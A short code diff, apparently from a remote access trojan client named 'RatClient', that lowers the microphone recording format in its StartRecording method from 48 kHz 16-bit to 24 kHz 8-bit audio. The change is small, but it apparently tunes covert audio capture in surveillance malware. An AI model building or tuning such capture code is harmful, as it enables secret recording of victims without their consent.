@@ -14,7 +14,7 @@ namespace RatClient.Mtool
         public void StartRecording()
         {
             waveSource = new WaveInEvent();
-            waveSource.WaveFormat = new WaveFormat(48000, 16, 2);
+            waveSource.WaveFormat = new WaveFormat(24000, 8, 2);
             waveSource.DeviceNumber = 0;
 
             memoryStream = new MemoryStream();
